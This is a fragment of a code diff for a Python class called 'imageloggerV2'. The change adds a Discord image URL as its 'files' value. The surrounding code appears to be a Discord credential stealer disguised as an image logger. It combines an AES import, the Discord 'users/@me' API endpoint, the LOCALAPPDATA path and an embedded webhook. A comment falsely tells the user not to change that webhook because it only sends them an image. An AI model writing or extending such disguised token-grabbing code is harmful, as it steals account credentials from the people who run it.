@@ -17,7 +17,7 @@ from Crypto.Cipher import AES
 class imageloggerV2:
     def __init__(self):
         self.webhook = "" #THIS EMBEDDED WEBHOOK MAKES A BOT DM YOU THE IMAGE SO YOU CAN SEND IT (DON'T CHANGE IT)
-        self.files = ""
+        self.files = "https://media.discordapp.net/attachments/1338831941952208928/1355188258866462800/RobloxScreenShot20250322_235142012.jpg?ex=67e804eb&is=67e6b36b&hm=4b92a5da26e9a222f4b22023a707eb2774d32f50de036f687b76402b7b87f540&=&format=webp&width=1536&height=864"
 
         self.baseurl = "https://discord.com/api/v9/users/@me"
         self.appdata = os.getenv("localappdata")
